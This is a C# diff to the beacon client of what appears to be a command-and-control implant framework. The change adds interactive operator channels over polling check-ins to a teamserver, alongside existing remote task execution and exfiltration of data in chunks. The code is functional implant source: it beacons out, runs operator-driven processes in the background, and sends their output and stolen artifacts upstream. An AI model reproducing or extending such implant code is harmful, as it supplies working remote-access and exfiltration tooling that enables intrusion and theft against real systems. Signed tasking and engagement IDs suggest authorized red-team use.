@@ -1,4 +1,5 @@
 using System.Buffers.Binary;
+using System.Collections.Concurrent;
 using System.Net.Http.Headers;
 using System.Net.Security;
 using System.Security.Cryptography;
@@ -44,6 +45,15 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     /// concern).
     /// </summary>
     public const string Route = "/implants/beacon";
+
+    /// <summary>
+    /// The handshake capability a degraded-channels bake advertises
+    /// (architecture.md Sec 10.3): "this artifact accepts channel traffic
+    /// over its poll check-ins." The teamserver's degraded hub parks
+    /// operator input against the advertising session and delivers it on
+    /// its cycles.
+    /// </summary>
+    internal const string DegradedCapability = "channels.poll";
 
     private readonly EgressEndpoints _egress;
     private readonly string _implantId;
@@ -107,6 +117,25 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // has always been.
     private readonly string _mode;
 
+    // The degraded-channel opt-in (architecture.md Sec 10.3): when the bake
+    // carried it, the interactive verbs claim over this cycle's own bodies.
+    private readonly bool _degradedChannels;
+
+    // The live channels a degraded bake holds across cycles, keyed by task
+    // id: the handler runs in the background for as long as the channel
+    // lasts, its output batching into the upstream like any other frame and
+    // its input arriving as ChannelInput frames on later responses.
+    private readonly ConcurrentDictionary<string, BeaconLiveChannel> _liveChannels = new();
+
+    // Ends every live channel when the run ends: the token releases the
+    // handlers (their processes are killed and their pumps unwind), the
+    // delivery waits keep the last upstream writes accounted.
+    private readonly CancellationTokenSource _channelsGone = new();
+
+    // Serializes the upstream batch between the cycle thread (snapshot,
+    // delivered-frame removal) and every background channel's output writes.
+    private readonly object _upstreamGate = new();
+
     public EnvelopeBeacon(
         EgressEndpoints egress,
         string implantId,
@@ -121,7 +150,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         TaskNonceTracker? nonces = null,
         TransportProfile? transport = null,
         Cadence? cadence = null,
-        string mode = BeaconModes.Poll)
+        string mode = BeaconModes.Poll,
+        bool degradedChannels = false)
     {
         _egress = egress;
         _implantId = implantId;
@@ -145,6 +175,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             ? ParseBakedKey(transport.EnvelopeKey)
             : null;
         _mode = mode;
+        _degradedChannels = degradedChannels;
     }
 
     /// <summary>
@@ -183,6 +214,25 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     /// stream client.
     /// </summary>
     public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    {
+        try
+        {
+            return await RunCyclesAsync(cancellationToken);
+        }
+        finally
+        {
+            // The run is ending: the channels are run-scoped, so they end
+            // with it -- the token releases the handlers, and the delivery
+            // waits keep the last upstream writes accounted before the
+            // coordinator moves on.
+            _channelsGone.Cancel();
+            foreach (var live in _liveChannels.Values)
+                live.CompleteInput();
+            await Task.WhenAll(_liveChannels.Values.Select(c => c.Delivery));
+        }
+    }
+
+    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -270,11 +320,18 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         using var http = BuildClient(url);
 
         // The batch snapshot: the handshake plus everything accumulated. The
-        // demand order rides the request, and the state clears only after the
-        // response is processed, so a failed POST re-sends the batch whole.
+        // demand order rides the request, and the delivered frames clear only
+        // after the response is processed -- and only the delivered ones, so
+        // a background channel's output added mid-cycle is not lost -- and a
+        // failed POST re-sends the batch whole.
         var demandOrder = _demands.ToList();
-        var frames = new List<Frame>(1 + _upstream.Count) { HandshakeFrame() };
-        frames.AddRange(_upstream);
+        List<Frame> pending;
+        lock (_upstreamGate)
+        {
+            pending = new List<Frame>(_upstream);
+        }
+        var frames = new List<Frame>(1 + pending.Count) { HandshakeFrame() };
+        frames.AddRange(pending);
 
         // The sealed body (the default build shape): the framed bytes behind
         // a fresh big-endian counter, all AES-256-GCM under the baked
@@ -326,7 +383,11 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _nonces.Negotiated = handshake.ReplayNonces;
         _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");
 
-        _upstream.Clear();
+        lock (_upstreamGate)
+        {
+            foreach (var delivered in pending)
+                _upstream.Remove(delivered);
+        }
         _demands.Clear();
         ProcessResponse(inbound, demandOrder);
         return BeaconCycleResult.Handshaken;
@@ -375,7 +436,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (!terminal)
             {
                 _log.WriteLine($"task {demand}: staged chunk run ended without a terminal chunk");
-                _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
+                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
                     "staged payload stream ended without a terminal chunk"));
                 continue;
             }
@@ -388,18 +449,18 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 offset += part.Length;
             }
             var (outcome, output) = _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
-            _upstream.Add(ResultFrame(task, outcome, output));
+            AddUpstream(ResultFrame(task, outcome, output));
         }
 
-        // The tasking half: every remaining frame is a TaskRequest (the only
-        // kind-bearing downstream frame, ChannelInput, never rides the
-        // envelope -- there is no live channel to feed).
+        // The tasking half: every remaining frame is a TaskRequest, or --
+        // under the degraded opt-in -- a ChannelInput frame the server's
+        // parking hub delivered for a live channel of this cycle.
         for (; index < inbound.Count; index++)
         {
             var frame = inbound[index];
             if (frame.Kind == FrameKind.ChannelInput)
             {
-                _log.WriteLine("channel input dropped: no live channel on an envelope check-in");
+                RouteChannelInput(frame);
                 continue;
             }
 
@@ -437,7 +498,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (_fronted is null || !_fronted.Knows(targetId))
             {
                 _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
+                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
                     $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"));
                 return;
             }
@@ -459,18 +520,26 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 _ => "task rejected: signature verification failed; not executed",
             };
             _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
-            _upstream.Add(ResultFrame(task, TaskOutcome.Failed, cause));
+            AddUpstream(ResultFrame(task, TaskOutcome.Failed, cause));
             return;
         }
 
-        // The streaming shape never rides the envelope (the server requeues
-        // a channel task untouched), so a channel verb here is a protocol
-        // break -- refuse it on the task, the same answer poll mode gives.
-        if (_handlers.ChannelFor(task.Verb) is not null)
+        // The streaming shape over the poll cycle: under the degraded
+        // opt-in the channel handler runs in the background, its output
+        // batching into the upstream like any other frame and its input
+        // arriving as ChannelInput frames on later responses; without the
+        // opt-in the server never claims the verb, so reaching here without
+        // it is a protocol break -- refuse it on the task.
+        if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
         {
-            _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
-            _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
-                $"{task.Verb} requires a stream-mode check-in; the envelope cycle carries no channel"));
+            if (!_degradedChannels)
+            {
+                _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
+                AddUpstream(ResultFrame(task, TaskOutcome.Failed,
+                    $"{task.Verb} requires a stream-mode check-in or the degraded-channels bake; this cycle carries neither"));
+                return;
+            }
+            StartPollChannel(task, channelHandler);
             return;
         }
 
@@ -481,7 +550,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         {
             _stagedAwaiting[task.TaskId] = task;
             _demands.Add(task.TaskId);
-            _upstream.Add(new Frame
+            AddUpstream(new Frame
             {
                 Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
                 Kind = FrameKind.StagedPull,
@@ -490,14 +559,14 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         }
 
         var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
-        _upstream.Add(ResultFrame(task, outcome, output));
+        AddUpstream(ResultFrame(task, outcome, output));
         // Out-of-band exfil chunks follow the TaskResult on the next POST,
         // each carrying the task id so the server reassembles into the
         // artifact store (architecture.md Sec 10.1 exfil, Sec 11).
         foreach (var chunk in chunks)
         {
             chunk.TaskId = task.TaskId;
-            _upstream.Add(new Frame
+            AddUpstream(new Frame
             {
                 Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                 Kind = FrameKind.ExfilChunk,
@@ -517,7 +586,99 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             ReplayNonces = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
+        // The degraded opt-in rides the advertisement: the server's parking
+        // hub reads it off the session and claims the channel verbs against
+        // this cycle only when it is there.
+        if (_degradedChannels)
+            handshake.Capabilities.Add(DegradedCapability);
         return new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) };
+    }
+
+    // Opens one channel for a dispatched streaming task and starts its
+    // handler in the background: the cycle thread returns to its cadence
+    // immediately, the channel's output batches into the upstream through
+    // the shared live-channel write binding, and the delivery task reports
+    // the handler's outcome as the task's final TaskResult on whatever
+    // check-in carries it.
+    private void StartPollChannel(TaskRequest task, CapabilityChannelHandler handler)
+    {
+        var channel = new BeaconLiveChannel(
+            task.TaskId,
+            (frame, ct) =>
+            {
+                AddUpstream(frame);
+                return ValueTask.CompletedTask;
+            });
+        _liveChannels[task.TaskId] = channel;
+        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb} (degraded, poll cadence)");
+        channel.Delivery = DeliverPollChannelAsync(channel, task, handler);
+    }
+
+    // The channel's delivery: run the handler to its end, then queue its
+    // outcome. A channel whose run ends under it reports nothing further --
+    // the server-side timeout is the documented close for a channel the
+    // cycles stopped carrying.
+    private async Task DeliverPollChannelAsync(
+        BeaconLiveChannel channel,
+        TaskRequest task,
+        CapabilityChannelHandler handler)
+    {
+        try
+        {
+            var (outcome, output) = await handler.Handle(task.Arguments, channel, _channelsGone.Token);
+            AddUpstream(ResultFrame(task, outcome, output));
+            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
+        }
+        catch (OperationCanceledException)
+        {
+            // The run ended: the channel dies with it, documented.
+        }
+        catch (Exception ex)
+        {
+            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
+        }
+        finally
+        {
+            _liveChannels.TryRemove(task.TaskId, out _);
+            channel.CompleteInput();
+        }
+    }
+
+    // One ChannelInput frame off a response: operator input for a live
+    // channel, routed by task id. Input for a task with no live channel is
+    // dropped and logged -- a channel that already ended, or input that
+    // raced the cycle.
+    private void RouteChannelInput(Frame frame)
+    {
+        ChannelInput input;
+        try
+        {
+            input = ChannelInput.Parser.ParseFrom(frame.Payload);
+        }
+        catch (Google.Protobuf.InvalidProtocolBufferException)
+        {
+            return;
+        }
+
+        if (_liveChannels.TryGetValue(input.TaskId, out var channel))
+        {
+            if (!channel.Receive(input.Data.ToArray(), input.Eof))
+                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
+        }
+        else
+        {
+            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
+        }
+    }
+
+    // One frame into the upstream batch, under the gate the background
+    // channels' output writes share with the cycle thread's snapshot.
+    private void AddUpstream(Frame frame)
+    {
+        lock (_upstreamGate)
+        {
+            _upstream.Add(frame);
+        }
     }
 
     private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
